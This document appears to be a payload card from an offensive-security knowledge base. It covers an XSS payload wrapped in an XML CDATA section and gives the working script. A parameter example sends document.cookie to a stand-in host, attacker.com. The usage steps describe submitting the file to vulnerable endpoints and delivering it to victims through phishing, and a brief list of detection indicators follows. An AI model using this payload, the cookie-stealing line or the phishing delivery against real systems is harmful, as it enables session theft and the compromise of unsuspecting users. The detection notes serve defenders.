---
id: f58a5fa6-678d-4b5b-9c6f-2c0808846c39
type: code
name: XML-CDATA-Wrapped-JavaScript-XSS
language: xml
verified: true
created_at: '2023-04-06T03:56:41.987134+00:00'
updated_at: '2023-04-10T20:21:55.152543+00:00'
platforms:
  - Web
tags:
  - xss
  - payload
  - xml-injection
validated: true
---

# XML-CDATA-Wrapped-JavaScript-XSS

## Code

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

## Description

This XML snippet injects a JavaScript XSS payload wrapped in a CDATA section to prevent XML parsing from interpreting the script tags as markup. When the XML is loaded in a browser (e.g., via an XMLHttpRequest or direct view), the CDATA content is rendered as HTML, executing the script. The example uses confirm(document.domain) to demonstrate execution by popping an alert with the current domain, but can be modified for data exfiltration or keylogging.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| Inner Script | The JavaScript code inside the CDATA section | `<script>document.location='http://attacker.com?cookie='+document.cookie</script>` |
| Element Names | XML tags like <name> and <value> to match the target structure | `<description>`, `<content>` |

## Usage

Embed this payload in user-controlled XML input fields during file uploads or API submissions. For example, save as payload.xml and submit via curl to a vulnerable endpoint. Deliver the resulting tainted XML file to the victim via phishing or shared links, prompting them to open it in a browser. This is commonly used in web app pentests targeting XML parsers like those in Java or .NET applications.

## Detection

- XML logs showing unescaped CDATA with script tags.
- Browser developer tools revealing unexpected JavaScript execution on XML loads.
- WAF alerts for CDATA containing '<script>' patterns.
- CSP violations if inline scripts are blocked.

## Related

- [[procedures/XML-Payload-Injection-for-XSS-in-Files]]
